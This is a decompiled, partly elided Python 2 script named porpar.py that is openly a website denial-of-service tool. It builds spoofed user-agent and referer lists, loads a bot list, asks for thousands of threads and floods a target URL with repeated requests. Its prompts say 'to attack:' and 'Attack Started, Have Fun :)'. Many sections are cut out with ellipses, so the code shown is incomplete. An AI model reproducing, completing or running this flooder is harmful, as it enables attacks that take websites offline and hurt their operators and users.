...
# Decompiled from: Python 2.7.14 (default, Jan  7 2018, 04:01:39) 
# [GCC 4.2.1 Compatible Android Clang 5.0.300080 ]
# Embedded file name: porpar.py
# Compiled at: 2018-04-27 01:19:00
import urllib2, sys, threading, random, socket, time, re
url = ''
host = ''
headers_useragents = []
headers_referers = []
...
def useragent_list():
    ...
    headers_useragents.append('FAST Enterprise Crawler 6 used by Sensis.com.au Web Crawler (search_comments\x07t\\sensis\\dot\\com\\dot\x07u)')
...
def referer_list():
    ...
    for i in range(200):
        headers_referers.append(botzzz)
        headers_referers.append(botzzz2)
        headers_referers.append(random.choice(botys))
...
def usage():
    print 'to attack:'
    print '#Windows: PorPar.py http://www.exemplo.com.br/'
    print '#Linux: python PorPar.py http://www.exemplo.com.br/'
    print '\x07'
...
def httpcall(url):
    ...
    try:
        ...
        print 'Connection To Website Failed! Already Down? :)'
    else:
        for i in range(200):
            inc_counter()
            urllib2.urlopen(request)
    ...
    def run(self):
        ...
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                print '%d Shots sends ' % request_counter
                previous = request_counter
...
if len(sys.argv) < 2:
    ...
    if sys.argv[1] == 'help':
        ...
        threads = input('Threads (8000): ')
        in_file = open(raw_input('Bot List (bots.txt): '), 'r')
        botz = in_file.read()
        in_file.close()
        botys = botz.split('\n')
        print ''
        ...
        print ''
        print '#Attacking With Web Bots'
        print ''
        print '#Attack Started, Have Fun :) !'
        if len(sys.argv) == 3:
            if sys.argv[2] == 'safe':
                set_safe()
        url = sys.argv[1]
